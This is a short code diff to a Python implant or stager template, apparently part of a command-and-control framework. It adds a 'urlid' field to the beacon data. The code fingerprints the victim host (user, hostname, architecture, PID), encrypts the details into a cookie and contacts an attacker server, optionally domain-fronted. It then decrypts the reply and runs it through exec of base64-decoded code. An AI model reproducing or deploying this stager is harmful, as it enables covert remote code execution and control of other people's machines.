@@ -4,6 +4,7 @@ pyhash="#REPLACEPYTHONHASH#"
 pykey="#REPLACESPYTHONKEY#"
 key="#REPLACEKEY#"
 serverclean="#REPLACEHOSTPORT#"
+urlid="#REPLACEURLID#"
 url="#REPLACEQUICKCOMMAND#"
 url2="#REPLACECONNECTURL#"
 hh="#REPLACEDOMAINFRONT#"
@@ -21,7 +22,7 @@ else: sys.exit(0)
 un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
 is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
 hn=socket.gethostname();o=urllib2.build_opener()
-encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,serverclean))
+encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
 if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
 res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');exec(base64.b64decode(x))
